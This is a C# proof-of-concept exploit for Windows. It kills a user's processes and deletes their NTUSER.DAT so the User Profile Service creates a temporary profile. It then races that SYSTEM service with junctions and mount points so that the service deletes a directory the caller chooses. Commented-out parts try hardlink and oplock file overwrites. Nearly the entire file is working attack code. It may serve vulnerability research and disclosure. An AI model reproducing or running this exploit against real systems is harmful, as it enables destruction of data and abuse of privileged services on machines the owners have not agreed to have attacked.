using Microsoft.Win32;
using NtApiDotNet;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static NtDataPoc.NativeWin32;

namespace NtDataPoc
{


    public class Exploit
    {


        private static string userName = "";
        private static string domainName = "";
        private static string password = "";
        private static string fileDat = "";
        private static string ntuserini = "";
        private static bool isGoingToKill = false;
        private static string tempUserHomeDir = @"C:\Users\temp";
        private static string tempMountpoint = @"C:\blah";
        private static string dirToDelete = @"C:\Users\theuser2";
        private static string fileLogName = @"c:\p0c_logs\poclog.txt";
        private static NtFile ntFile;
        private const UInt32 INFINITE = 0xFFFFFFFF;
        private const UInt32 WAIT_FAILED = 0xFFFFFFFF;

        private const int LOGON32_PROVIDER_DEFAULT = 0;
        //This parameter causes LogonUser to create a primary token.
        private const int LOGON32_LOGON_INTERACTIVE = 2;

        static void Main(string[] args)
        {

            SafeTokenHandle safeTokenHandle;
            try
            {
                if (args != null && (args.Length < 3 || args.Length > 4))
                {
                    Console.WriteLine("Usage: program.exe USERNAME DOMAINNAME PASSWORD [DIRECTORY_TO_DELETE]");
                    return;
                }
                userName = args[0];
                domainName = args[1];
                password = args[2];

                File.WriteAllText(fileLogName, $"LOG STARTED {DateTime.UtcNow.ToString("yyyy-MM-ddTHH:mm:ss.fffffffZ")} " + Environment.NewLine);

                if (args.Length == 4)
                {
                    dirToDelete = args[3];
                    if (!Directory.Exists(dirToDelete))
                    {
                        Console.WriteLine($"Directory {dirToDelete} does not exist ");
                        File.AppendAllText(fileLogName, $"Directory {dirToDelete} does not exist " + Environment.NewLine);
                        return;
                    }
                }
                //dirToDelete = args[3];

                if (!Directory.Exists(@"c:\p0c_logs"))
                {
                    Directory.CreateDirectory(@"c:\p0c_logs");
                }



                bool returnValue = LogonUser(userName, domainName, password, out safeTokenHandle);

                using (safeTokenHandle)
                {
                    Console.WriteLine("Did LogonUser Succeed? " + (returnValue ? "Yes" : "No"));
                    Console.WriteLine("Value of Windows NT token: " + safeTokenHandle);
                    File.AppendAllText(fileLogName, "Did LogonUser Succeed? " + (returnValue ? "Yes" : "No") + Environment.NewLine);
                    File.AppendAllText(fileLogName, "Value of Windows NT token: " + safeTokenHandle + Environment.NewLine);

                    // Check the identity.
                    Console.WriteLine("Before impersonation: "
                        + WindowsIdentity.GetCurrent().Name);
                    File.AppendAllText(fileLogName, "Before impersonation: "
                        + WindowsIdentity.GetCurrent().Name + Environment.NewLine);
                    // Use the token handle returned by LogonUser.
                    using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(safeTokenHandle.DangerousGetHandle()))
                    {

                        // Check the identity.
                        Console.WriteLine("After impersonation: "
                            + WindowsIdentity.GetCurrent().Name);
                        File.AppendAllText(fileLogName, "After impersonation: "
                            + WindowsIdentity.GetCurrent().Name + Environment.NewLine);
                        string impersonatedSid = WindowsIdentity.GetCurrent().User.Value;

                        KillProcessBySidUserName(impersonatedSid, Process.GetCurrentProcess().Id);
                        Console.WriteLine("[+] Killed user processes  ");
                        File.AppendAllText(fileLogName, "[+] Killed user processes  " + Environment.NewLine);

                        // cleaning up

                        if (Directory.Exists(tempMountpoint))
                        {
                            Directory.Delete(tempMountpoint, true);
                            Console.WriteLine($@"[+] clean up directory {tempMountpoint}");
                            File.AppendAllText(fileLogName, $@"[+] clean up directory {tempMountpoint}" + Environment.NewLine);
                        }

                        // trying to read current user home directory
                        string userHomeDir = "";
                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey($@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\{impersonatedSid}"))
                        {
                            if (key != null)
                            {
                                Object profileImagePath = key.GetValue("ProfileImagePath");
                                if (profileImagePath != null)
                                {
                                    userHomeDir = profileImagePath.ToString();
                                }
                            }
                        }
                        // user home directory exists
                        // we're going to delete NTUSER.DAT in order to trigger ProfSvc service 
                        // After that, ProfSvc service creates a temporary USER home in c:\users\TEMP
                        // and we're gonna exploit SYSTEM privilegs that service is using
                        if (!string.IsNullOrEmpty(userHomeDir))
                        {
                            Console.WriteLine($@"[-] {userHomeDir} exists ");
                            File.AppendAllText(fileLogName, $@"[-] {userHomeDir} exists " + Environment.NewLine);
                            fileDat = $@"{userHomeDir}\NTUSER.DAT";
                            if (File.Exists(fileDat))
                            {
                                File.Delete(fileDat);
                                Console.WriteLine($@"[+] {fileDat} exists and is deleted ");
                                File.AppendAllText(fileLogName, $@"[+] {fileDat} exists and is deleted " + Environment.NewLine);
                            }
                        }

                        /*


                        bool created = HardLink.CreateNtHardLink(fileDatLOG1, @"c:\Windows\System32\license.rtf");
                        Console.WriteLine("first hardlink created " + created);

                        created = HardLink.CreateNtHardLink(fileDatLOG2, @"c:\Windows\System32\license2.rtf");
                        Console.WriteLine("second hardlink created " + WindowsIdentity.GetCurrent().Name);
                        
                        Task t = WaitOplock(fileDatLOG1, Encoding.UTF8.GetBytes("HELLO"));
                        //bool isCompleted = t.Wait(60000);
                        */
                    }

                    /*
                    Thread thread = new Thread(TriggerProcess);
                    thread.Start();
                    thread.IsBackground = true;
                    thread.Join();
                    */
                    new Thread(() =>
                    {
                        // Starting cmd.exe process as current USER
                        // This triggers temporary user home creation
                        Thread.Sleep(1000);
                        SecureString secPassword = new SecureString();
                        Array.ForEach(password.ToCharArray(), secPassword.AppendChar);
                        secPassword.MakeReadOnly();
                        Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.Domain = domainName;
                        process.StartInfo.UserName = userName;
                        process.StartInfo.Password = secPassword;
                        process.StartInfo.LoadUserProfile = true;
                        process.StartInfo.WorkingDirectory = Path.GetDirectoryName(process.StartInfo.FileName);
                        process.Start();
                        isGoingToKill = true;
                        Thread.Sleep(500);
                        process.Kill();
                    }).Start();


                    string AppDataUsrClassDat = tempUserHomeDir + @"\AppData\Local\Microsoft\Windows";

                    using (safeTokenHandle)
                    {
                        // Use the token handle returned by LogonUser.
                        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(safeTokenHandle.DangerousGetHandle()))
                        {
                            // Impersonating
                            while (true)
                            {
                                // as soon as tempUserHomeDir (c:\users\temp) is created we create a mountpoint to c:\blah 
                                // First TOCTOU
                                if (Directory.Exists(tempUserHomeDir))
                                {
                                    JunctionPoint.Create(tempUserHomeDir, tempMountpoint, true);
                                    Console.WriteLine($@"[+] created mountpoint {tempUserHomeDir} to {tempMountpoint}");
                                    File.AppendAllText(fileLogName, $@"[+] created mountpoint {tempUserHomeDir} to {tempMountpoint}" + Environment.NewLine);

                                    try
                                    {
                                        // AppData\Local\Microsoft\Windows\UsrClass.dat
                                        //Directory.CreateDirectory(AppDataUsrClassDat);
                                        //Console.WriteLine($@"[-] Creating mount point: {AppDataUsrClassDat} -> {dirToDelete}");
                                        NtFile.CreateMountPoint(NtFileUtils.DosFileNameToNt(tempUserHomeDir), NtFileUtils.DosFileNameToNt(dirToDelete), null);
                                        Console.WriteLine($@"[+] Done -> mount point: {tempUserHomeDir} -> {dirToDelete}");
                                        File.AppendAllText(fileLogName, $@"[+] Done -> mount point: {tempUserHomeDir} -> {dirToDelete}" + Environment.NewLine);
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine($"[!] Error ... {ex.Message}");
                                        File.AppendAllText(fileLogName, $"[!] Error ... {ex.Message}" + Environment.NewLine);
                                        break;
                                    }

                                    //while (true && isGoingToKill)
                                    /*while (true)
                                    {
                                        // Get handle immediately upon service closing file
                                        try
                                        {
                                            Console.WriteLine($@"[-] Attempt to acquire oplock {tempUserHomeDir}\ntuser.ini ");
                                            ntFile = NtFile.Open(NtFileUtils.DosFileNameToNt(tempUserHomeDir + @"\ntuser.ini"), null,
                                                FileAccessRights.GenericRead | FileAccessRights.GenericWrite |
                                                FileAccessRights.MaximumAllowed | FileAccessRights.Synchronize,
                                                FileShareMode.None,
                                                FileOpenOptions.NonDirectoryFile | FileOpenOptions.OpenRequiringOplock |
                                                FileOpenOptions.SynchronousIoNonAlert);
                                            if (ntFile.OpenResult != FileOpenResult.Opened) continue;
                                            Console.WriteLine($@"[+] Opened ntFile with handle: {ntFile.Handle.DangerousGetHandle()}");
                                            //Task t = WaitOplock(AppDataUsrClassDat + @"\UsrClass.dat", Encoding.UTF8.GetBytes("HELLO"));
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine($"[!] Error ... {ex.Message}");
                                            continue;
                                        }

                                        try
                                        {
                                            Console.WriteLine($"[-] Overwriting  file with bytes");
                                            ntFile.Write(Encoding.UTF8.GetBytes("HELLO"));
                                            ntFile.SetEndOfFile(Encoding.UTF8.GetBytes("HELLO").Length);
                                            ntFile.Close();
                                            Console.WriteLine($"[+] Done");
                                        }
                                        catch (Exception ex)
                                        {
                                            Console.WriteLine($@"[!] Error writing bytes... {ex.Message}");
                                            break;
                                        }

                                        break;
                                    }*/
                                    break;
                                }
                                else
                                {
                                    continue;
                                }
                            }

                        }

                    }
                }

                NotepadHelper.ShowMessage($"Your dir {dirToDelete} should be empty now.. Use this thing responsibly " + Environment.NewLine +
                    "Now you need to Re-LogOn as I had to kill all your processes");
                // Releasing the context object stops the impersonation
                // Check the identity.
                Console.WriteLine("After closing the context: " + WindowsIdentity.GetCurrent().Name);
                return;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Doh.. exception occurred " + ex.Message);
                File.AppendAllText(fileLogName, "Doh.. exception occurred " + ex.Message + Environment.NewLine);
            }

        }


        private static void TriggerProcess()
        {
            Thread.Sleep(300);
            SecureString secPassword = new SecureString();
            Array.ForEach(password.ToCharArray(), secPassword.AppendChar);
            secPassword.MakeReadOnly();
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.Domain = domainName;
            process.StartInfo.UserName = userName;
            process.StartInfo.Password = secPassword;
            process.StartInfo.LoadUserProfile = true;
            process.StartInfo.WorkingDirectory = Path.GetDirectoryName(process.StartInfo.FileName);
            process.Start();
            //process.Kill();
        }

        private static async Task WaitOplock(string theFile, byte[] data)
        {
            while (true)
            {
                try
                {
                    using (NtFile locked_file = NtFile.Open(NtFileUtils.DosFileNameToNt(theFile),
                        null, FileAccessRights.MaximumAllowed))
                    {

                        // Check the identity.
                        Console.WriteLine("Impersonating : "
                            + WindowsIdentity.GetCurrent().Name);
                        Console.WriteLine("Setting Oplock");
                        //await locked_file.OplockExclusiveAsync();
                        await locked_file.RequestOplockAsync(OplockRequestLevel.Level1, CancellationToken.None);
                        Console.WriteLine("Oplock Signaled");
                        locked_file.Write(data, 0);
                        locked_file.SetEndOfFile(data.Length);
                        locked_file.Close();
                        break;
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("continuing to WaitOplock ");
                    continue;
                }
            }
        }

        private static bool LogonUser(string userName, string domainName, string password, out SafeTokenHandle safeTokenHandle)
        {
            // Get the user token for the specified user, domain, and password using the
            // unmanaged LogonUser method.
            // The local machine name can be used for the domain name to impersonate a user on this machine.

            // Call LogonUser to obtain a handle to an access token.
            bool returnValue = NativeWin32.LogonUser(userName, domainName, password,
                LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT,
                out safeTokenHandle);

            Console.WriteLine("LogonUser called.");

            if (false == returnValue)
            {
                int ret = Marshal.GetLastWin32Error();
                Console.WriteLine("LogonUser failed with error code : {0}", ret);
                File.AppendAllText(fileLogName, $"LogonUser failed with error code : {ret} " + Environment.NewLine);
                throw new System.ComponentModel.Win32Exception(ret);
            }
            return returnValue;
        }


        private static void KillProcessBySidUserName(string sid, int currentId)
        {
            /*var processes = from p in Process.GetProcesses()
                            where GetProcessOwner(p.Id) == sid && p.Id != currentId
                            select p;*/
            Console.WriteLine($"Current process ID {currentId} ");
            File.AppendAllText(fileLogName, $"Current process ID {currentId} " + Environment.NewLine);

            Process[] processes = Process.GetProcesses();
            foreach (Process p in processes)
            {
                if (GetProcessOwner(p.Id) == sid && p.Id != currentId)
                {
                    Console.WriteLine($"Attempting kill process owned by {sid} -> Id {p.Id} ProcessName {p.ProcessName} ");
                    File.AppendAllText(fileLogName, $"Attempting kill process owned by {sid} -> Id {p.Id} ProcessName {p.ProcessName} " + Environment.NewLine);
                    p.Kill();
                }
            }
            //foreach (Process p in processes) p.Kill();
        }

        private static string GetProcessOwner(int processId)
        {

            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection processList = searcher.Get();

            foreach (ManagementObject obj in processList)
            {
                string[] argList = new string[] { string.Empty };
                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));

                string[] sid = new String[1];
                obj.InvokeMethod("GetOwnerSid", (object[])sid);
                if (!string.IsNullOrEmpty(sid[0]))
                    return sid[0];
            }

            return "NO OWNER";

        }

    }

}


